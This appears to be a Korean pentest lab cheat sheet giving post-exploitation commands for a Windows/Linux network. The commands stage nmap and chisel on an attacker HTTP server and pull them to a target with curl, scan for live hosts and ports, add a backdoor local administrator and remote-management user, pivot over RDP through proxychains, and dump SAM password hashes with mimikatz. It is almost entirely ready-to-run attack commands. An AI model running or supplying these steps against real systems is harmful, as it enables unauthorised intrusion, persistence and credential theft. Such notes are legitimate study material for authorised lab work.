
```bash title="사용 가능한 호스트 찾기"
arp -a
```


```bash title="ip 확인, 인터페이스 확인, 라우터 확인"
ip a
ip route
```


nmap 바이너리 다운로드
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap

```bash title="공격자 서버"
wget https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/nmap
--2025-07-08 09:41:39--  https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/nmap

python3 -m http.server 80
```

```bash title="Target"
curl 10.250.180.2/nmap -o nmap
```



Chisel 다운로드
https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz

```bash title="공격자 서버"
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz   
--2025-07-08 09:46:35--  https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz

gunzip -d chisel_1.10.1_linux_amd64.gz

chmod +x chisel_1.10.1_linux_amd64

mv chisel_1.10.1_linux_amd64 chisel     # 그냥 파일 이름 바꾸기

python3 -m http.server 80
```

```bash title="Target"
curl 10.250.180.2/chisel -o chisel
```



```bash title="Target"
chmod +x nmap
chmod +x chisel
```




```bash title="Target 서버에서 ip ping 스캔 (살아있는 호스트 찾기)"
./nmap -v -sn 10.200.180.0/24 --open
```
![[Pasted image 20250708225829.png]]


```bash title="살아있는 호스트들에 대해 포트스캔"
./nmap 10.200.180.100 10.200.180.150 10.200.180.250 -v -Pn -oN nmap.log -T5
```






[Windows 쉘 획득 시]
```powershell title="사용자 추가"
net user [USERNAME] [PASSWORD] /add
```


```powershell title="Administrators 그룹 할당"
net localgroup Administrators [USERNAME] /add
```


```powershell title="Remote Management Users 그룹에 추가"
net localgroup "Remote Management Users" [USERNAME] /add
```


```bash title="RDP 연결"
proxychains -q xfreerdp /v:10.200.180.150 /u:cyberbarbie /p:marksanchez +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```



[mimikatz]
```powershell title="실행"
\\tsclient\\share\mimikatz\x64\mimikatz.exe
```


```powershell title="해시 덤프"
privilege::debug
token::elevate
lsadump::sam
```


